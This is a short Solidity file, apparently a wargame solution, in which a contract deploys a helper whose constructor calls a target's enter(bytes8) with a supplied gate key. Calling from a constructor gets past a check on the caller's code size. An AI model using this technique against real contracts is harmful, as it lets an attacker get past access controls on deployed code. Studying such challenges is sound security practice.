// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Bullet {
    constructor(address __target, bytes8 __gateKey) {
        // address target = 0xd9145CCE52D386f254917e481eB44e9943F39138;
        __target.call(
            abi.encodeWithSignature("enter(bytes8)", __gateKey)
        );
    }
}

contract AK47 {
    function shoot(address _target, bytes8 _gateKey) external {
        Bullet bullet = new Bullet(_target, _gateKey);
    }
}

